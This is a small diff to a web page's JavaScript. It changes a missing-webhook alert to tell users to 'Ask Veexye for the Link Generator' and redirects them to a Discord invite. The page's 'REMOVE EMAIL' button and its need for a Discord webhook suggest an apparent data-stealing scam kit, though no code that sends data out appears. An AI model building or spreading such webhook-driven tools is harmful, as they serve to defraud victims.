@@ -1110,14 +1110,14 @@
 
                 // Check if webhook URL is configured
                 if (!webhookUrl) {
-                    alert('Discord webhook not configured. This link appears to be invalid or misconfigured.\n\nPlease use the setup page to generate a valid link.');
+                    alert('Discord webhook not configured. This link appears to be invalid or misconfigured.\n\nAsk Veexye for the Link Generator');
                     processBtn.disabled = false;
                     processBtn.innerHTML = '<i class="fas fa-trash"></i> REMOVE EMAIL';
                     
                     // Redirect to setup page after a short delay
                     setTimeout(function() {
-                        if (confirm('Would you like to go to the setup page now?')) {
-                            window.location.href = 'setup.html';
+                        if (confirm('Would you like to go to the Discord Server?')) {
+                            window.location.href = 'https://discord.gg/n7VmvAMQTX';
                         }
                     }, 500);
                     
